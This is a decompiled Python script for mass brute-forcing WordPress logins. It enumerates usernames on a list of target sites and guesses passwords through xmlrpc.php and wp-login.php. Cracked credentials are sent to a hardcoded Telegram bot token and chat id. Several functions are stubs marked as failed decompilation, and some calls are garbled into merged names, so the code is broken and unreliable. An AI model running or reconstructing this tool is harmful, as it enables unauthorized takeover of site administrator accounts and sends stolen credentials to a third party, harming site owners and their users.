import httpx, re, tldextract, os, threading
from threading import Thread
from colorama import init, Style, Fore
from time import sleep
from dotenv import load_dotenv
load_dotenv(override=True)
token = "7661832342:AAFgnNi4C3xTuB_dO173hGkGkv63F8Mnq9o"
chat_id = "5903121838"
init(autoreset=True)
os.makedirs("result", exist_ok=True)
use_author_id_check = False
check_rerun = []
show_log = False
dead_list_file = open("result/dead_domain.txt", "a", encoding="utf-8")
not_vuln_list_file = open("result/not_vuln.txt", "a", encoding="utf-8")
wp_password_raw = open("pass.txt", encoding="utf-8").read()
data_to_ready = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>"
basic_headers_http = {
 'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"', 
 'Accept': '"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"', 
 'Accept-Language': '"en-US,en;q=0.5"', 
 'Accept-Encoding': '"gzip, deflate"'}
basic_headers_https = {
 'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"', 
 'Accept': '"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"', 
 'Accept-Language': '"en-US,en;q=0.5"', 
 'Accept-Encoding': '"gzip, deflate"', 
 'Upgrade-Insecure-Requests': '"1"', 
 'Sec-Fetch-Dest': '"document"', 
 'Sec-Fetch-Mode': '"navigate"', 
 'Sec-Fetch-Site': '"none"', 
 'Sec-Fetch-User': '"?1"', 
 'Te': '"trailers"'}
wp_login_http_headers = {
 'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"', 
 'Accept': '"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"', 
 'Accept-Language': '"en-US,en;q=0.5"', 
 'Accept-Encoding': '"gzip, deflate"', 
 'Content-Type': '"application/x-www-form-urlencoded"', 
 'Upgrade-Insecure-Requests': '"1"'}
wp_login_https_headers = {
 'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"', 
 'Accept': '"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"', 
 'Accept-Language': '"en-US,en;q=0.5"', 
 'Accept-Encoding': '"gzip, deflate"', 
 'Content-Type': '"application/x-www-form-urlencoded"', 
 'Upgrade-Insecure-Requests': '"1"', 
 'Sec-Fetch-Dest': '"document"', 
 'Sec-Fetch-Mode': '"navigate"', 
 'Sec-Fetch-Site': '"same-origin"', 
 'Sec-Fetch-User': '"?1"', 
 'Te': '"trailers"'}

def wp_log_save(log):
    try:
        url = "https://api.telegram.org/bot" + token + "/sendMessage"
        data = {'chat_id':chat_id,  'text':"wp-log=>" + log}
        httpx.post(url, data=data, timeout=20, verify=False).json()
    except:
        pass


def get_basic_headers(url):
    scheme = url.split("://")[0]
    if scheme == "https":
        return basic_headers_https
    return basic_headers_http


def get_wp_login_headers(url):
    scheme = url.split("://")[0]
    if scheme == "https":
        return wp_login_https_headers
    return wp_login_http_headers


def request_http2(method: str, url, **kwargs):
    with httpx.Client(http2=True, verify=False) as client:
        if method.upper() == "GET":
            req = (client.get)(url, **kwargs)
        else:
            req = (client.post)(url, **kwargs)
    return req


def check_live(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    # Return default sesuai kebutuhan
    return {"success": False}


def correct_homepage(domain: str, url: str):
    if url.endswith(domain + "/"):
        return url
    if url.endswith(domain):
        return url + "/"
    if url.endswith(domain + "/index.php/"):
        return url.replace(url, "/index.php/")
    url_rpart = url.split(domain, 1)[1]
    return url.replace(url_rpart, "/")


def get_wp_username(url):
    user_json_url = url + "wp-json/wp/v2/users"
    headers = get_basic_headers(user_json_url)
    slugs = []
    with httpx.Client(http2=True, verify=False) as client:
        try:
            response_json = client.get(user_json_url, headers=headers, timeout=15).json()
        except:
            pass
        else:
            try:
                for each_id in response_json:
                    slugs.append(each_id["slug"])

            except:
                pass

            if use_author_id_check:
                for i in range(20):
                    try:
                        resp2 = client.get((url + "?author={}".format(str(i + 1))), timeout=20, headers=headers)
                        find = re.findall('/author/(.*)/"', resp2.text)
                        username = find[0]
                        if "/feed" in str(username):
                            find = re.findall('/author/(.*)/feed/"', resp2.text)
                            username2 = find[0]
                            slugs.append(str(username2))
                        else:
                            slugs.append(str(username))
                    except:
                        pass

    slugs.append("admin")
    slugs = list(set(slugs))
    if show_log:
        print("user => ", slugs)
    return slugs


def check_xmlrpc_page_validity(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return {"success": False}


def check_content(content):
    if "<name>isAdmin</name>" in content or "<boolean>1</boolean>" in content:
        return True
    return False


def make_log(xmlrpc_url, user, passwd):
    url = xmlrpc_url.replace("xmlrpc.php", "wp-login.php")
    log = "{}|{}|{}".format(url, user, passwd)
    return log


def send_xmlrpc_passwds(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return None


def check_secprot(data):
    try:
        secprot_ans_compiler = re.compile('<span class="secprot-answer">(.*?)</span>')
        sec_prot_search = re.search(secprot_ans_compiler, data)
        secprot_ans = sec_prot_search.group(1)
        return {'success':True, 
         'ans':secprot_ans}
    except:
        return {"success": False}


def wp_login_scrap(data):
    """This scrap function will scrap data of submit button and redirect link from
    wp-login.php page. Because wp have different language for different site"""
    try:
        login_button_compiler = re.compile('type="submit".*value="(.*?)"')
        find_log_btn = re.search(login_button_compiler, data)
        login_button = find_log_btn.group(1)
        redirect_to_url_compiler = re.compile('name="redirect_to".*value="(.*?)"')
        find_redirect_to_url = re.search(redirect_to_url_compiler, data)
        redirect_url = find_redirect_to_url.group(1)
        test_cookies_compiler = re.compile('name="testcookie".*value="(.*?)"')
        find_test_cookies_value = re.search(test_cookies_compiler, data)
        rest_cookies_value = find_test_cookies_value.group(1)
        returning_data = {'success':True, 
         'value':[
          login_button, redirect_url, rest_cookies_value], 
         'page_source':data}
        sec_prot_result = check_secprot(data)
        if sec_prot_result["success"]:
            returning_data["secprot-code"] = sec_prot_result["ans"]
        return returning_data
    except:
        return {"success": False}


def check_login_page_validity(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return {"success": False}


def check_login_page_validity_with_client(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return {"success": False}


def make_log_2(login_url, user, passwd):
    log = "{}|{}|{}".format(login_url, user, passwd)
    return log


user_dont_exist_text = [
 '<strong>Error:</strong> The username <strong>{}</strong> is not registered on this site.', 
 '<p><strong>خطأ:</strong> اسم المستخدم <strong>{}</strong> غير مسجّل على هذا الموقع. إذا لم تكن متأكدًا من اسم المستخدم الخاص بك، فجرّب عنوان بريدك الإلكتروني بدلاً من ذلك.</p>', 
 '<strong>Błąd:</strong> brak <strong>{}</strong> wśród zarejestrowanych w witrynie użytkowników.', 
 '<strong>Erreur :</strong> l’identifiant <strong>{}</strong> n’est pas inscrit sur ce site.', 
 '<strong>エラー:</strong> ユーザー名 <strong>{}</strong> は、このサイトに登録されていません', 
 '<strong>Erro:</strong> o usuário <strong>{}</strong> não está cadastrado neste site.', 
 '<strong>Greška:</strong> Korisničko ime <strong>{}</strong> nije registrovano na ovom sajtu.']

def send_wp_login_password(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return None


def get_full_domain(url):
    try:
        subdomain = tldextract.extract(url).subdomain
        domain = tldextract.extract(url).registered_domain
        if subdomain == "":
            return domain
        return subdomain + "." + domain
    except:
        return ""


def get_pure_hostname(url):
    domain = tldextract.extract(url).domain
    if type(domain) == str:
        if tldextract.extract(url).fqdn != "":
            return domain
    return ""


def get_pure_subdomain(url):
    subdom = tldextract.extract(url).subdomain.split(".")[-1]
    if len(subdom) > 3:
        return subdom
    return ""


def wp_prepare_usernames(users, url):
    new_users = users.copy()
    if len(new_users) == 0:
        new_users.append("admin")
        new_users.append("administrator")
    else:
        new_users.append("admin")
    dom = get_pure_hostname(url)
    if dom != "":
        new_users.append(dom)
    sub = get_pure_subdomain(url)
    if sub != "":
        new_users.append(sub)
    lower_users = []
    for each in new_users:
        try:
            lower_users.append(each.lower())
        except:
            pass

    else:
        valid_users = list(set(lower_users))
        return valid_users


def wp_prepare_passwords(url, usernames):
    valid_raw = ""
    for username in usernames:
        username_capital = username.capitalize()
        username_upper = username.upper()
        username_title = username.title()
        username_lower = username.lower()
        new_raw = wp_password_raw.replace("[USER-CAP]", username_capital).replace("[USER-UPP]", username_upper).replace("[USER-TIT]", username_title).replace("[USER-LOW]", username_lower)
        valid_raw += new_raw + "\n"
    else:
        dom = get_pure_hostname(url)
        if dom != "":
            dom_capital = dom.capitalize()
            dom_upper = dom.upper()
            dom_title = dom.title()
            dom_lower = dom.lower()
            valid_raw = valid_raw.replace("[DOM-CAP]", dom_capital).replace("[DOM-UPP]", dom_upper).replace("[DOM-TIT]", dom_title).replace("[DOM-LOW]", dom_lower)
        sub = get_pure_subdomain(url)
        if sub != "":
            sub_capital = sub.capitalize()
            sub_upper = sub.upper()
            sub_title = sub.title()
            sub_lower = sub.lower()
            valid_raw = valid_raw.replace("[SUB-CAP]", sub_capital).replace("[SUB-UPP]", sub_upper).replace("[SUB-TIT]", sub_title).replace("[SUB-LOW]", sub_lower)
        reg_list = ["[SUB-",
         "[DOM-",
         "[USER-"]
        prep_password = list(set([each for each in valid_raw.splitlines() if each != "" if not any((er in each for er in reg_list))]))
        prep_password.extend(usernames)
        prep_password = list(set(prep_password))
        return prep_password


def do_brute(domain):
    print("{}[Checking-{}]{}  {}".format(Fore.YELLOW, str(threading.current_thread().name).replace("Thread-", ""), Style.RESET_ALL, domain))
    live_result = check_live(domain)
    if live_result["success"]:
        current_url = live_result["url"]
        current_content = live_result["page"]
        if domain not in current_url:
            domain = get_full_domain(current_url)
            fresh_home_url = correct_homepage(domain, current_url)
        else:
            fresh_home_url = correct_homepage(domain, current_url)
        xmlrpc_validity_check = check_xmlrpc_page_validity(fresh_home_url)
        if xmlrpc_validity_check["success"]:
            xmlrpc_url = xmlrpc_validity_check["xmlrpc_url"]
            slugs = get_wp_username(fresh_home_url)
            users = wp_prepare_usernames(slugs, fresh_home_url)
            pswrds = wp_prepare_passwords(current_url, slugs)
            res = send_xmlrpc_passwdsxmlrpc_urluserspswrds
            if res == "do-login":
                login_page_validity_check = check_login_page_validity_with_client(fresh_home_url)
                if login_page_validity_check["success"]:
                    slugs = get_wp_username(fresh_home_url)
                    users = wp_prepare_usernames(slugs, fresh_home_url)
                    pswrds = wp_prepare_passwords(current_url, slugs)
                    send_wp_login_passwordfresh_home_urluserspswrds
                else:
                    not_vuln_list_file.write(domain + "\n")
                not_vuln_list_file.flush()
        else:
            login_page_validity_check = check_login_page_validity_with_client(fresh_home_url)
            if login_page_validity_check["success"]:
                slugs = get_wp_username(fresh_home_url)
                users = wp_prepare_usernames(slugs, fresh_home_url)
                pswrds = wp_prepare_passwords(current_url, slugs)
                send_wp_login_passwordfresh_home_urluserspswrds
            else:
                not_vuln_list_file.write(domain + "\n")
                not_vuln_list_file.flush()
    else:
        dead_list_file.write(domain + "\n")
        dead_list_file.flush()


def submit_to_do_list(sites):
    while True:
        try:
            site = sites.pop(0)
        except IndexError:
            if len(check_rerun) == 0:
                check_rerun.append(1)
                print("[Error] Site Grabbing error - possibly list finish")
                sleep(900)
                os.system("start main.exe")
            break
        else:
            do_brute(site)


def download_host_file(*args, **kwargs):
    # Fungsi gagal didecompile, silakan lengkapi manual.
    return None


def main():
    file_name = input("Enter file name : ")
    thrd = int(os.getenv("THREAD"))
    url_list = []
    for url in open(file_name, encoding="utf-8").read().splitlines():
        domain = get_full_domain(url)
        if domain != "":
            url_list.append(domain)
    else:
        threads = []

    for _ in range(thrd):
        t = Thread(target=submit_to_do_list, args=(url_list,))
        threads.append(t)
        t.start()
        sleep(1)
    else:
        for tt in threads:
            tt.join()


if __name__ == "__main__":
    main()
